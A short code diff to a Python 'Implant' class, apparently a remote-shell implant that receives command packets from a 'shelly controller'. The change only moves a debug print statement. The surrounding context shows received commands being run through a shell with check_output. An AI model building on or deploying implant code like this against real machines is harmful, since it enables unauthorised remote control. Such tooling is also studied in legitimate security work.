@@ -69,6 +69,7 @@ class Implant(Host):
             return
 
         decoded_data = shellpack['data'].decode()
+        print(decoded_data)
 
         match shellpack['option']:
             case "TRUNCATED":
@@ -102,8 +103,6 @@ class Implant(Host):
         
         Responds to errors by sending messages back to the shelly controller
         """
-
-        print(cmd)
 
         try:
             output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
